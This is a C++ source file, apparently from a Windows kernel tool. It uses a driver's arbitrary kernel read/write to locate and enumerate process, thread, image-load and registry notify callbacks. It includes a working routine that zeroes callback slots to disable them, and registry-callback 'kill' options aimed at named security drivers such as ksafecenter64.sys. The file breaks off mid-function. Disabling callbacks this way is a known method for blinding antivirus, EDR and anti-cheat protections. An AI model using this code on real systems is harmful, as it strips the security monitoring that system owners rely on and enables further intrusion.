#include <Windows.h>
#include <Psapi.h>
#include <DbgHelp.h>
#pragma comment(lib, "dbghelp.lib")
#include <cstdio>
#include <cstring>
#include <vector>
#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "jutil.h"
#include "ansi.h"

// ── Kernel structures ─────────────────────────────────────────────────────────
//
// PspLoadImageNotifyRoutine[64]    : EX_CALLBACK array (LoadImage)
// PspCreateProcessNotifyRoutine[64]: EX_CALLBACK array (CreateProcess)
// PspCreateThreadNotifyRoutine[64] : EX_CALLBACK array (CreateThread)
//
// EX_CALLBACK (8 bytes):
//   RoutineBlock : EX_FAST_REF  — pointer with low 4 bits = ref count
//   Decode: block = value & ~0xF  ->  EX_CALLBACK_ROUTINE_BLOCK*
//
// EX_CALLBACK_ROUTINE_BLOCK (Windows 10 x64, all modern builds):
//   +0x00  RundownProtect : EX_RUNDOWN_REF  (8 bytes)
//   +0x08  Function       : PEX_CALLBACK_FUNCTION   <- the callback
//   +0x10  Context        : PVOID
//
// The three arrays are NOT exported directly; we locate them by scanning
// the corresponding PsRemove* exported function for the first
// LEA reg, [RIP+disp32] instruction (REX.W 8D /r, mod=00 rm=101).

#define ECRB_FUNCTION   0x08
#define NOTIFY_MAX      64

// ── Helpers ───────────────────────────────────────────────────────────────────

static inline DWORD64 DecodeRef(DWORD64 ref) { return ref & ~(DWORD64)0xF; }

// Return the RVA range of a named PE section in the loaded module.
// Returns false if section not found.
static bool GetSectionRange(HMODULE hNt, const char* secName,
                            DWORD64* outBase, DWORD64* outEnd)
{
    auto* dos = (IMAGE_DOS_HEADER*)hNt;
    auto* nt  = (IMAGE_NT_HEADERS64*)((BYTE*)hNt + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        char name[9]{}; memcpy(name, sec->Name, 8);
        if (_stricmp(name, secName) == 0) {
            *outBase = sec->VirtualAddress;
            *outEnd  = sec->VirtualAddress + sec->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// Locate a Psp*NotifyRoutine array VA by scanning an exported function for
// RIP-relative LEA instructions.
//   skipVA  : skip any kernel VA equal to this (previously found array)
//   dataBase/dataEnd : only accept RVAs inside this range (from .data section)
static DWORD64 FindArrayViaExport(HMODULE hNt, DWORD64 userBase, DWORD64 kernBase,
                                  const char* exportFn,
                                  DWORD64 skipVA   = 0,
                                  DWORD64 dataBase = 0,
                                  DWORD64 dataEnd  = 0,
                                  int scanBytes    = 512)
{
    BYTE* fn = (BYTE*)GetProcAddress(hNt, exportFn);
    if (!fn) { DBG("%s: export not found\n", exportFn); return 0; }

    DBG("%s: scanning %d bytes\n", exportFn, scanBytes);
    for (int i = 0; i < scanBytes - 6; i++) {
        // REX.W (48) or REX.WR (4C) + LEA (8D) + ModRM mod=00 rm=101
        if ((fn[i] == 0x48 || fn[i] == 0x4C) &&
             fn[i+1] == 0x8D &&
            (fn[i+2] & 0xC7) == 0x05)
        {
            INT32 disp      = *(INT32*)(fn + i + 3);
            DWORD64 userTgt = (DWORD64)(fn + i + 7) + (INT64)disp;
            DWORD64 rva     = userTgt - userBase;
            DWORD64 va      = kernBase + rva;
            DBG("  +%03d LEA -> rva=0x%llx va=%p", i, (unsigned long long)rva, (void*)va);
            if (va == skipVA)                                      { printf(" [skip:dup]\n");       continue; }
            if (dataBase != dataEnd && !(rva >= dataBase && rva < dataEnd)) { printf(" [skip:not .data]\n"); continue; }
            printf(" [accept]\n");
            return va;
        }
    }
    DBG("  no valid LEA found\n");
    return 0;
}

// ── Entry scan ────────────────────────────────────────────────────────────────

struct NotifyEntry {
    int     index;
    DWORD64 slotAddr;       // kernel VA of EX_CALLBACK slot in the array
    DWORD64 routineBlock;   // decoded EX_FAST_REF (EX_CALLBACK_ROUTINE_BLOCK*)
    DWORD64 function;       // actual callback function pointer
    DWORD64 context;        // EX_CALLBACK_ROUTINE_BLOCK + 0x10
    const wchar_t* owner;
    DWORD64 ownerOff;
    const wchar_t* ctxOwner;   // driver owning the context pointer
    DWORD64 ctxOwnerOff;
    bool    isLinkedList;   // true = CallbackListHead node, false = EX_CALLBACK array slot
};

static std::vector<NotifyEntry> ScanArray(DWORD64 arrayKVA) {
    std::vector<NotifyEntry> v;
    if (!arrayKVA) return v;

    DBG("ScanArray @ %p\n", (void*)arrayKVA);
    for (int i = 0; i < NOTIFY_MAX; i++) {
        DWORD64 slotAddr = arrayKVA + (DWORD64)i * 8;
        DWORD64 rawRef   = g_drv->Rd64(slotAddr);
        if (!rawRef) continue;

        DWORD64 block = DecodeRef(rawRef);
        DBG("  slot[%d] raw=%p block=%p", i, (void*)rawRef, (void*)block);
        if (!g_drv->IsKernelVA(block)) { printf(" [skip:bad block]\n"); continue; }

        DWORD64 fn = g_drv->Rd64(block + ECRB_FUNCTION);
        if (!fn || !g_drv->IsKernelVA(fn)) { printf(" [skip:bad fn=%p]\n", (void*)fn); continue; }
        DBG("  fn=%p\n", (void*)fn);

        // Filter stale/garbage entries:
        //   - First byte is an invalid x64 opcode (0x06 = PUSH ES, 32-bit only)
        //   - First 8 bytes look like a LIST_ENTRY self-reference (kernel VA pointing
        //     to itself +8), indicating a freed pool block reused as linked list node
        {
            BYTE firstByte = g_drv->Rd8(fn);
            DWORD64 fnQword = g_drv->Rd64(fn);

            // Invalid x64 opcodes that indicate data, not code
            bool invalidOpcode = (firstByte == 0x06 || firstByte == 0x07 ||  // PUSH/POP ES
                                  firstByte == 0x0E ||                        // PUSH CS
                                  firstByte == 0x16 || firstByte == 0x17 ||  // PUSH/POP SS
                                  firstByte == 0x1E || firstByte == 0x1F ||  // PUSH/POP DS
                                  firstByte == 0x27 || firstByte == 0x2F ||  // DAA/DAS
                                  firstByte == 0x37 || firstByte == 0x3F ||  // AAA/AAS
                                  firstByte == 0x60 || firstByte == 0x61 ||  // PUSHA/POPA
                                  firstByte == 0xD4 || firstByte == 0xD5 ||  // AAM/AAD
                                  firstByte == 0xD6 ||                        // SALC
                                  firstByte == 0x9A || firstByte == 0xEA);    // CALLF/JMPF

            // LIST_ENTRY self-reference: first QWORD points near itself (±0x10)
            bool selfRef = g_drv->IsKernelVA(fnQword) &&
                           (fnQword >= fn && fnQword <= fn + 0x10);

            if (invalidOpcode || selfRef) {
                DBG("  slot[%d] fn=%p stale (byte=0x%02X selfRef=%d) -> skip\n",
                    i, (void*)fn, firstByte, selfRef);
                continue;
            }
        }

        NotifyEntry e{};
        e.index        = i;
        e.slotAddr     = slotAddr;
        e.routineBlock = block;
        e.function     = fn;
        e.isLinkedList = false;
        KUtil::FindDriverByAddr(fn, &e.owner, &e.ownerOff);
        v.push_back(e);
    }
    return v;
}

// ── Display ───────────────────────────────────────────────────────────────────

static bool IsSuspicious(const wchar_t* name) {
    if (!name) return true;
    static const wchar_t* ms[] = {
        L"ntoskrnl.exe", L"hal.dll", L"WdFilter.sys", L"CI.dll",
        L"ksecdd.sys",   L"cng.sys", nullptr
    };
    for (int i = 0; ms[i]; i++)
        if (_wcsicmp(name, ms[i]) == 0) return false;
    return true;
}

static void PrintEntry(int idx, const NotifyEntry& e, const char* typeLabel) {
    const char* color = IsSuspicious(e.owner) ? A_RED : A_YELLOW;
    printf("\n  %s[%d]%s %-14s  Slot:%-2d  Block:%p\n",
        A_BOLD, idx, A_RESET, typeLabel, e.index, (void*)e.routineBlock);
    wprintf(L"       Fn  : %hs%p%hs  %hs%ls%hs +0x%llx\n",
        color, (void*)e.function, A_RESET,
        color, e.owner, A_RESET,
        (unsigned long long)e.ownerOff);
    if (e.context) {
        const char* ccolor = (e.ctxOwner && e.ctxOwner[0] != L'\0') ? A_CYAN : A_DIM;
        wprintf(L"       Ctx : %hs%p%hs  %ls +0x%llx\n",
            ccolor, (void*)e.context, A_RESET,
            e.ctxOwner ? e.ctxOwner : L"<unknown>",
            (unsigned long long)e.ctxOwnerOff);
    }
    // Dump first 16 bytes of Fn to check for trampoline (jmp/call)
    if (e.function && g_drv->IsKernelVA(e.function)) {
        BYTE code[16]{};
        for (int b = 0; b < 16; b += 8) {
            DWORD64 qw = g_drv->Rd64(e.function + b);
            memcpy(code + b, &qw, 8);
        }
        printf("       Code: ");
        for (int b = 0; b < 16; b++) printf("%02X ", code[b]);
        // Check for FF 25 (jmp [rip+disp]) or E9 (jmp rel32)
        if (code[0] == 0xFF && code[1] == 0x25) {
            INT32 disp = *(INT32*)(code + 2);
            DWORD64 tgt = g_drv->Rd64(e.function + 6 + disp);
            const wchar_t* jOwner = nullptr; DWORD64 jOff = 0;
            KUtil::FindDriverByAddr(tgt, &jOwner, &jOff);
            wprintf(L" -> jmp [%p] = %p %ls+0x%llx",
                (void*)(e.function + 6 + disp), (void*)tgt,
                jOwner ? jOwner : L"??", (unsigned long long)jOff);
        } else if (code[0] == 0xE9) {
            INT32 disp = *(INT32*)(code + 1);
            DWORD64 tgt = e.function + 5 + disp;
            const wchar_t* jOwner = nullptr; DWORD64 jOff = 0;
            KUtil::FindDriverByAddr(tgt, &jOwner, &jOff);
            wprintf(L" -> jmp %p %ls+0x%llx",
                (void*)tgt, jOwner ? jOwner : L"??", (unsigned long long)jOff);
        }
        printf("\n");
    }
}

// ── Public commands ───────────────────────────────────────────────────────────

void CmdNotify(bool doImage, bool doProcess, bool doThread) {
    SetConsoleOutputCP(CP_UTF8);
    KUtil::BuildDriverCache();

    LPVOID drv[1]; DWORD cb;
    EnumDeviceDrivers(drv, sizeof(drv), &cb);
    DWORD64 kernBase = (DWORD64)drv[0];

    HMODULE hNt = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNt) { printf("[!] Cannot load ntoskrnl.exe\n"); return; }
    DWORD64 userBase = (DWORD64)hNt;

    struct { const char* label; const char* exportFn; bool enabled; DWORD64 arrayVA; } sections[] = {
        { "LoadImage",     "PsRemoveLoadImageNotifyRoutine",     doImage,   0 },
        { "CreateProcess", "PsRemoveCreateProcessNotifyRoutine", doProcess, 0 },
        { "CreateThread",  "PsRemoveCreateThreadNotifyRoutine",  doThread,  0 },
    };

    DWORD64 dataBase = 0, dataEnd = 0;
    GetSectionRange(hNt, ".data", &dataBase, &dataEnd);
    DBG(".data RVA range: 0x%llx - 0x%llx\n",
        (unsigned long long)dataBase, (unsigned long long)dataEnd);

    // Resolve LoadImage first; pass its VA as skipVA for CreateProcess since
    // PsSetCreateProcessNotifyRoutineEx's first LEA may land on the same array.
    for (auto& s : sections) {
        if (!s.enabled) continue;
        DWORD64 skip = (strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0)
                       ? sections[0].arrayVA : 0;
        s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase, s.exportFn,
                                       skip, dataBase, dataEnd);
        // Fallback for CreateProcess: try non-Ex Set, then Ex Set
        if (!s.arrayVA && strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0) {
            DBG("CreateProcess: primary failed, trying non-Ex Set fallback\n");
            s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase,
                                           "PsSetCreateProcessNotifyRoutine",
                                           sections[0].arrayVA, dataBase, dataEnd);
        }
        if (!s.arrayVA && strcmp(s.exportFn, "PsRemoveCreateProcessNotifyRoutine") == 0) {
            DBG("CreateProcess: non-Ex failed, trying Ex fallback\n");
            s.arrayVA = FindArrayViaExport(hNt, userBase, kernBase,
                                           "PsSetCreateProcessNotifyRoutineEx",
                                           sections[0].arrayVA, dataBase, dataEnd);
        }
        DBG("%s array -> %p\n", s.label, (void*)s.arrayVA);
    }

    FreeLibrary(hNt);

    if (g_jsonMode) {
        printf("{\"command\":\"notify\",\"callbacks\":[\n");
        bool first = true;
        for (auto& s : sections) {
            if (!s.enabled) continue;
            auto v = ScanArray(s.arrayVA);
            for (auto& e : v) {
                if (!first) printf(",\n");
                first = false;
                printf(" {\"type\":%s,\"slot\":%d,\"block\":%s,\"fn\":%s,"
                       "\"owner\":%s,\"offset\":\"0x%llx\"}",
                    JEscape(s.label).c_str(), e.index,
                    JAddr(e.routineBlock).c_str(),
                    JAddr(e.function).c_str(),
                    JEscape(e.owner).c_str(),
                    (unsigned long long)e.ownerOff);
            }
        }
        printf("\n]}\n");
        return;
    }

    int total = 0;
    for (auto& s : sections) {
        if (!s.enabled) continue;
        printf("\n=== %s NotifyRoutines ===\n", s.label);
        if (!s.arrayVA) { printf("  [!] Failed to locate array (export scan failed)\n"); continue; }
        auto v = ScanArray(s.arrayVA);
        if (v.empty()) { printf("  (none)\n"); continue; }
        for (auto& e : v) PrintEntry(total++, e, s.label);
    }
    printf("\n  Total: %d notify entries\n\n", total);
}

void CmdNotifyDisable(unsigned long long targetFn) {
    SetConsoleOutputCP(CP_UTF8);
    KUtil::BuildDriverCache();

    LPVOID drv[1]; DWORD cb;
    EnumDeviceDrivers(drv, sizeof(drv), &cb);
    DWORD64 kernBase = (DWORD64)drv[0];

    HMODULE hNt = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNt) { printf("[!] Cannot load ntoskrnl.exe\n"); return; }
    DWORD64 userBase = (DWORD64)hNt;

    DWORD64 dataBase = 0, dataEnd = 0;
    GetSectionRange(hNt, ".data", &dataBase, &dataEnd);

    const char* exportNames[] = {
        "PsRemoveLoadImageNotifyRoutine",
        "PsSetCreateProcessNotifyRoutineEx",
        "PsRemoveCreateThreadNotifyRoutine",
        nullptr
    };
    DWORD64 arrays[3]{};
    arrays[0] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[0],
                                   0, dataBase, dataEnd);
    // Try Remove → non-Ex Set → Ex Set
    arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, "PsRemoveCreateProcessNotifyRoutine",
                                   arrays[0], dataBase, dataEnd);
    if (!arrays[1])
        arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, "PsSetCreateProcessNotifyRoutine",
                                       arrays[0], dataBase, dataEnd);
    if (!arrays[1])
        arrays[1] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[1],
                                       arrays[0], dataBase, dataEnd);
    arrays[2] = FindArrayViaExport(hNt, userBase, kernBase, exportNames[2],
                                   0, dataBase, dataEnd);

    bool found = false;
    for (int t = 0; exportNames[t] && !found; t++) {
        DWORD64 arr = arrays[t];
        if (!arr) continue;

        for (int i = 0; i < NOTIFY_MAX && !found; i++) {
            DWORD64 slotAddr = arr + (DWORD64)i * 8;
            DWORD64 rawRef   = g_drv->Rd64(slotAddr);
            if (!rawRef) continue;

            DWORD64 block = DecodeRef(rawRef);
            if (!g_drv->IsKernelVA(block)) continue;

            DWORD64 fn = g_drv->Rd64(block + ECRB_FUNCTION);
            if (fn != (DWORD64)targetFn) continue;

            const wchar_t* owner; DWORD64 off;
            KUtil::FindDriverByAddr(fn, &owner, &off);
            wprintf(L"  [*] Found: %p  %ls +0x%llx\n", (void*)fn, owner, (unsigned long long)off);
            printf("  [*] Slot[%d] @ %p  Block @ %p\n", i, (void*)slotAddr, (void*)block);

            // Zero the EX_CALLBACK slot — kernel skips NULL entries on iteration
            g_drv->Wr64(slotAddr, 0);
            printf("  [+] Disabled (slot zeroed)\n");
            found = true;
        }
    }

    FreeLibrary(hNt);

    if (!found)
        printf("  [!] No notify entry found with function == %p\n", (void*)(DWORD64)targetFn);
}

// ── /notify registry ─────────────────────────────────────────────────────────
//
// CmRegisterCallback stores callbacks in CmpCallBackVector, which on
// Windows 10 x64 is an EX_CALLBACK[100] array — identical layout to
// PspLoadImageNotifyRoutine[64].  Each slot is an EX_FAST_REF:
//
//   slot (8 bytes): raw EX_FAST_REF
//     decode:  block = raw & ~0xF  ->  EX_CALLBACK_ROUTINE_BLOCK*
//     +0x00  RundownProtect : EX_RUNDOWN_REF
//     +0x08  Function       : PEX_CALLBACK_FUNCTION   <- the registry callback
//     +0x10  Context        : PVOID
//
// We locate the array by scanning CmUnRegisterCallback for the first
// RIP-relative LEA pointing into ntoskrnl .data.
//
// To kill an entry: zero the EX_CALLBACK slot — kernel skips NULL on walk.
//
// ⚠️ KNOWN ISSUE (2026-04-10 session_backup):
//   FindCmpCallBackVector() may find the wrong array — the address found via
//   CmUnRegisterCallback LEA scan matched a dispatch table, not the real
//   CmpCallBackVector. Evidence: repeating stride-8 ntoskrnl addresses,
//   UTF-16 strings in slots, fn first-byte not valid x64 prologues.
//   The real CmpCallBackVector may be a CM_CALLBACK_ENTRY linked list,
//   not a flat EX_CALLBACK[100] array.
//
// ppm-engine v0.2.1 cross-verification (2026-04-11):
//   ksafecenter64.sys CmRegisterCallbackEx @ 0x7A47:
//     callback function = 0x7C20 (RegNtPreSetValueKey handler)
//     protects: \Registry\Machine\SOFTWARE\kSafeCenter
//   kboot64.sys also has CmCallback (cm_callback conf=0.85 @ 0x1853F)
//   -> If array scan fails, fallback: search loaded driver address ranges
//      for known CmCallback function offsets from ppm static analysis.

#define CM_ARRAY_MAX  100

// Validate that a kernel VA looks like a CmpCallBackVector (EX_CALLBACK array):
// at least one slot in [0..CM_ARRAY_MAX) must decode to a valid EX_CALLBACK_ROUTINE_BLOCK
// with a kernel-range function pointer that does NOT fall back into the array itself.
// Check if a byte is a plausible x64 function prologue start.
// This is intentionally permissive — false negatives (rejecting real callbacks)
// are far worse than false positives (accepting non-callbacks), because a
// false negative breaks CmCallback discovery entirely.
static bool IsValidPrologue(BYTE b) {
    // Definite prologues:
    //   40-4F  REX prefixes (48=REX.W, 4C=REX.WR, 41=REX.B, etc.)
    //   53/55/56/57  push rbx/rbp/rsi/rdi
    //   E9  jmp (thunk/trampoline)
    //   33/8B/89  xor/mov (register setup)
    if ((b >= 0x40 && b <= 0x4F) ||
        b == 0x53 || b == 0x55 || b == 0x56 || b == 0x57 ||
        b == 0xE9 || b == 0x33 || b == 0x8B || b == 0x89)
        return true;
    // NOP alignment: some functions start after NOP padding (e.g. 90 90 90 <real entry>).
    // The callback pointer may land on the NOP sled before the real prologue.
    if (b == 0x90) return true;   // NOP
    if (b == 0xCC) return true;   // INT3 padding (breakpoint / alignment)
    // Arithmetic/logic first instructions (rare but legal):
    //   04 = ADD AL, imm8  (seen in ksafe CmCallback on build 19045)
    //   0F = two-byte opcode escape (e.g. 0F 1F = NOP, 0F B6 = MOVZX)
    //   83 = SUB/ADD/CMP r/m32, imm8 (e.g. sub esp, N)
    //   B8-BF = MOV r32, imm32
    //   50-5F = PUSH r32/r64
    //   F6/F7 = TEST/NOT/NEG/MUL/DIV
    //   FF = CALL/JMP indirect
    if (b == 0x04 || b == 0x0F || b == 0x83 ||
        (b >= 0x50 && b <= 0x5F) ||
        (b >= 0xB8 && b <= 0xBF) ||
        b == 0xF6 || b == 0xF7 || b == 0xFF ||
        b == 0x98 || b == 0x99 ||  // CWDE/CDQ (sign-extend, seen in ksafe callbacks)
        b == 0xC3 ||               // RET (stub/trampoline)
        b == 0xEB ||               // JMP short
        b == 0x65 ||               // GS: segment prefix (e.g. mov rax, gs:[...])
        b == 0xFA || b == 0xFB)    // CLI/STI (interrupt control)
        return true;
    return false;
}

static bool LooksLikeCmArray(DWORD64 va)
{
    // Require at least one slot that:
    //  1. block is a paged-pool VA (not back in the array)
    //  2. block + 0x00 (RundownProtect) is NOT a kernel VA (should be 0 or tiny ref count)
    //  3. fn = block + 0x08 is a kernel VA not in the array
    //  4. fn resolves to a KNOWN loaded driver (not <unknown>)
    //  5. fn first byte is a valid x64 function prologue (not data/pointer)
    //
    // Also: count valid vs total non-zero slots. If < 50% valid, reject.
    // (dispatch tables have many entries that fail prologue check)
    int totalNonZero = 0, validEntries = 0;

    for (int i = 0; i < CM_ARRAY_MAX; i++) {
        DWORD64 raw = g_drv->Rd64(va + (DWORD64)i * 8);
        if (!raw) continue;
        totalNonZero++;

        DWORD64 block = raw & ~(DWORD64)0xF;
        if (!g_drv->IsKernelVA(block)) continue;
        if (block >= va && block < va + (DWORD64)CM_ARRAY_MAX * 8) continue;

        // RundownProtect at +0x00 must not be a kernel VA
        DWORD64 rundown = g_drv->Rd64(block + 0x00);
        if (g_drv->IsKernelVA(rundown)) continue;

        DWORD64 fn = g_drv->Rd64(block + ECRB_FUNCTION);
        if (!fn || !g_drv->IsKernelVA(fn)) continue;
        if (fn >= va && fn < va + (DWORD64)CM_ARRAY_MAX * 8) continue;

        // Function must resolve to a known loaded driver (non-empty name)
        const wchar_t* owner = nullptr; DWORD64 off = 0;
        KUtil::FindDriverByAddr(fn, &owner, &off);
        if (!owner || owner[0] == L'\0') continue;

        // NEW: fn first byte must be a valid x64 prologue instruction
        // This rejects dispatch table entries where "fn" is actually a data pointer
        BYTE firstByte = g_drv->Rd8(fn);
        if (!IsValidPrologue(firstByte)) {
            DBG("    LooksLikeCmArray: slot[%d] fn=%p firstByte=0x%02X (not prologue) -> skip\n",
                i, (void*)fn, firstByte);
            continue;
        }

        validEntries++;
        DBG("    LooksLikeCmArray: slot[%d] block=%p fn=%p owner=%ls prologue=0x%02X OK\n",
            i, (void*)block, (void*)fn, owner, firstByte);
    }

    // Dispatch tables have many non-zero slots but most fail prologue check.
    // Real CmpCallBackVector: few entries (1-10), all valid.
    // Reject if too many non-zero slots with no valid entries (dispatch table).
    if (validEntries == 0) return false;
    if (totalNonZero > 20 && validEntries < 2) {
        DBG("    LooksLikeCmArray: suspicious ratio %d/%d (too many bad slots)\n",
            validEntries, totalNonZero);
        return false;
    }
    DBG("    LooksLikeCmArray: accepted (%d valid / %d total)\n", validEntries, totalNonZero);
    return true;
}

static DWORD64 FindCmpCallBackVector(HMODULE hNt, DWORD64 userBase, DWORD64 kernBase)
{
    DWORD64 dataBase = 0, dataEnd = 0;
    GetSectionRange(hNt, ".data", &dataBase, &dataEnd);

    // Collect ALL RIP-relative LEA/.data candidates from both exports,
    // then pick the first one that passes the EX_CALLBACK array validation.
    std::vector<DWORD64> candidates;

    const char* probes[] = { "CmUnRegisterCallback", "CmRegisterCallback",
                              "CmRegisterCallbackEx", nullptr };
    for (int p = 0; probes[p]; p++) {
        BYTE* fn = (BYTE*)GetProcAddress(hNt, probes[p]);
        if (!fn) { DBG("%s: not found\n", probes[p]); continue; }
        DBG("FindCmpCallBackVector: scanning %s\n", probes[p]);

        for (int i = 0; i < 512 - 6; i++) {
            if ((fn[i] == 0x48 || fn[i] == 0x4C) &&
                (fn[i+1] == 0x8D || fn[i+1] == 0x8B) &&
                (fn[i+2] & 0xC7) == 0x05)
            {
                INT32 disp      = *(INT32*)(fn + i + 3);
                DWORD64 userTgt = (DWORD64)(fn + i + 7) + (INT64)disp;
                DWORD64 rva     = userTgt - userBase;
                DWORD64 va      = kernBase + rva;
                if (dataBase != dataEnd && !(rva >= dataBase && rva < dataEnd)) {
                    DBG("  +%03d -> rva=0x%llx [skip: not .data]\n", i, (unsigned long long)rva);
                    continue;
                }
                DBG("  +%03d -> rva=0x%llx va=%p [candidate]\n", i, (unsigned long long)rva, (void*)va);
                // Dedup
                bool dup = false;
                for (DWORD64 c : candidates) if (c == va) { dup = true; break; }
                if (!dup) candidates.push_back(va);
            }
        }
    }

    DBG("FindCmpCallBackVector: %zu candidates, validating...\n", candidates.size());
    for (DWORD64 va : candidates) {
        if (LooksLikeCmArray(va)) {
            DBG("  -> validated: %p\n", (void*)va);
            return va;
        }
        DBG("  -> %p failed validation\n", (void*)va);
    }
    DBG("FindCmpCallBackVector: no valid array found\n");
    return 0;
}

void CmdNotifyRegistry(const char* killDriver, DWORD64 killKva, bool killUnknown)
{
    SetConsoleOutputCP(CP_UTF8);
    KUtil::BuildDriverCache();

    LPVOID drv[1]; DWORD cb;
    EnumDeviceDrivers(drv, sizeof(drv), &cb);
    DWORD64 kernBase = (DWORD64)drv[0];

    HMODULE hNt = LoadLibraryW(L"ntoskrnl.exe");
    if (!hNt) { printf("[!] Cannot load ntoskrnl.exe\n"); return; }
    DWORD64 userBase = (DWORD64)hNt;

    DWORD64 arrayVA = FindCmpCallBackVector(hNt, userBase, kernBase);
    FreeLibrary(hNt);

    // ── Method 1: EX_CALLBACK array scan (legacy, pre-19041 kernels) ──────
    std::vector<NotifyEntry> v;

    if (arrayVA) {
        printf("CmpCallBackVector @ %p (array mode)\n", (void*)arrayVA);
        for (int i = 0; i < CM_ARRAY_MAX; i++) {
            DWORD64 slotAddr = arrayVA + (DWORD64)i * 8;
            DWORD64 rawRef   = g_drv->Rd64(slotAddr);
            if (!rawRef) continue;

            DWORD64 block = DecodeRef(rawRef);
            DBG("  cm_slot[%d] raw=%p block=%p", i, (void*)rawRef, (void*)block);
            if (!g_drv->IsKernelVA(block)) { DBG(" [skip:bad block]\n"); continue; }

            DWORD64 fn = g_drv->Rd64(block + ECRB_FUNCTION);
            if (!fn || !g_drv->IsKernelVA(fn)) { DBG(" [skip:bad fn=%p]\n", (void*)fn); continue; }
            if (fn >= arrayVA && fn < arrayVA + (DWORD64)CM_ARRAY_MAX * 8) {
                DBG(" [skip:fn in array]\n"); continue;
            }
            DBG(" fn=%p\n", (void*)fn);

            {
                DWORD64 fnFirst = g_drv->Rd64(fn);
                if (g_drv->IsKernelVA(fnFirst)) continue;
                if (fnFirst == 0) continue;
                BYTE fb[8]; memcpy(fb, &fnFirst, 8);
                int nz = 0; for (int b = 0; b < 8; b++) if (fb[b] == 0) nz++;
                if (nz >= 5) continue;
            }

            DWORD64 ctx = g_drv->Rd64(block + 0x10);
            NotifyEntry e{};
            e.index        = i;
            e.slotAddr     = slotAddr;
            e.routineBlock = block;
            e.function     = fn;
            e.context      = ctx;
            e.ctxOwner     = nullptr;
            e.ctxOwnerOff  = 0;
            KUtil::FindDriverByAddr(fn, &e.owner, &e.ownerOff);
            if (e.ownerOff > 0x4000000) { e.owner = L"<unknown>"; e.ownerOff = 0; }
            if (ctx && g_drv->IsKernelVA(ctx)) {
                KUtil::FindDriverByAddr(ctx, &e.ctxOwner, &e.ctxOwnerOff);
                if (e.ctxOwnerOff > 0x4000000) { e.ctxOwner = nullptr; e.ctxOwnerOff = 0; }
            }
            v.push_back(e);
        }
    }

    // ── Method 2: CallbackListHead linked list (Win10 19041+) ─────────────
    // On 19041+ the CmCallback entries are stored as a doubly-linked list
    // at nt!CallbackListHead, not a fixed array. Each node layout:
    //   +0x00  LIST_ENTRY (Flink/Blink)
    //   +0x28  Function pointer (callback)
    //   +0x20  Context pointer
    //   +0x30  Altitude UNICODE_STRING
    // Always try linked list too — array may find FLTMGR but miss ksafe.
    {
        // Try to find CallbackListHead via PDB symbol
        DWORD64 listHead = 0;
        {
            HANDLE hSym = (HANDLE)(ULONG_PTR)0xDEAD0099;
            SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
            WCHAR symPath[512];
            wcscpy_s(symPath, L"srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols;"
                              L"C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\sym");
            if (SymInitializeW(hSym, symPath, FALSE)) {
                WCHAR ntPath[MAX_PATH];
                WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
                swprintf_s(ntPath, L"%s\\System32\\ntoskrnl.exe", winDir);
                DWORD64 modBase = SymLoadModuleExW(hSym, nullptr, ntPath, nullptr, kernBase, 0x1100000, nullptr, 0);
                if (modBase || GetLastError() == 0) {
                    if (!modBase) modBase = kernBase;
                    BYTE symBuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME] = {};
                    SYMBOL_INFO* sym = (SYMBOL_INFO*)symBuf;
                    sym->SizeOfStruct = sizeof(SYMBOL_INFO);
                    sym->MaxNameLen = MAX_SYM_NAME;
                    if (SymFromName(hSym, "CallbackListHead", sym))
                        listHead = sym->Address;
                    else if (SymFromName(hSym, "nt!CallbackListHead", sym))
                        listHead = sym->Address;
                }
                SymCleanup(hSym);
            }
        }

        if (!listHead) {
            // Fallback: try LEA scan for CallbackListHead near CmRegisterCallbackEx
            // The address is typically at CmpCallbackListLock+8
            // CmpCallbackListLock is one of our candidates
            DBG("CallbackListHead: PDB lookup failed, trying LEA candidates +8\n");
            // Reload ntoskrnl for scanning
            HMODULE hNt2 = LoadLibraryW(L"ntoskrnl.exe");
            if (hNt2) {
                BYTE* fnCm = (BYTE*)GetProcAddress(hNt2, "CmRegisterCallbackEx");
                if (fnCm) {
                    for (int i = 0; i < 512 - 6; i++) {
                        if ((fnCm[i] == 0x48 || fnCm[i] == 0x4C) &&
                            fnCm[i+1] == 0x8D && (fnCm[i+2] & 0xC7) == 0x05) {
                            INT32 disp = *(INT32*)(fnCm + i + 3);
                            DWORD64 userTgt = (DWORD64)(fnCm + i + 7) + (INT64)disp;
                            DWORD64 rva = userTgt - (DWORD64)hNt2;
                            DWORD64 va = kernBase + rva;
                            // CallbackListHead: first QWORD should be a pool VA (Flink)
                            DWORD64 flink = g_drv->Rd64(va);
                            if (g_drv->IsKernelVA(flink) && flink != va) {
                                // Verify: Flink->Blink should point back to head
                                DWORD64 blink = g_drv->Rd64(flink + 8);
                                if (blink == va) {
                                    listHead = va;
                                    DBG("CallbackListHead found via LEA: %p (Flink=%p)\n",
                                        (void*)va, (void*)flink);
                                    break;
                                }
                            }
                        }
                    }
                }
                FreeLibrary(hNt2);
            }
        }

        if (listHead) {
            printf("CallbackListHead @ %p (linked list mode)\n", (void*)listHead);

            // Walk the linked list
            DWORD64 cur = g_drv->Rd64(listHead);  // Flink
            int idx = 0;
            while (g_drv->IsKernelVA(cur) && cur != listHead && idx < 64) {
                // Node layout: +0x00 Flink, +0x08 Blink, +0x28 Function, +0x20 Context
                DWORD64 fn  = g_drv->Rd64(cur + 0x28);
                DWORD64 ctx = g_drv->Rd64(cur + 0x20);

                if (fn && g_drv->IsKernelVA(fn)) {
                    // Dedup: skip if already found by array scan
                    bool dup = false;
                    for (auto& existing : v) {
